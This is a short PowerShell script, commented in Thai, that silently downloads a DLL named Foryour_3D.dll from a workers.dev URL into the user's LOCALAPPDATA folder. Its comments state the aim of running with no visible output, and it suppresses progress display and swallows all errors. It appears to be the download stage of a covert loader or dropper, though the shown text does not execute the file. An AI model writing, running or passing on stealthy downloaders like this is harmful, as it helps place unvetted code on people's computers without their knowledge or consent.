# ปิดการแสดงแถบดาวน์โหลดและข้อความทั้งหมด (ทำงานแบบเงียบสนิท 100%)
$ProgressPreference = 'SilentlyContinue'

$dllUrl = "https://zenx-installer.0xforyourstore.workers.dev/app"
$installDir = "$env:LOCALAPPDATA\Foryour3D"
$dllPath = "$installDir\Foryour_3D.dll"

try {
    # สร้างโฟลเดอร์สำหรับเก็บ DLL
    if (!(Test-Path $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    }

    # ดาวน์โหลดไฟล์ Foryour_3D.dll แบบเงียบๆ
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing

} catch {
    # ทำงานเงียบ
}
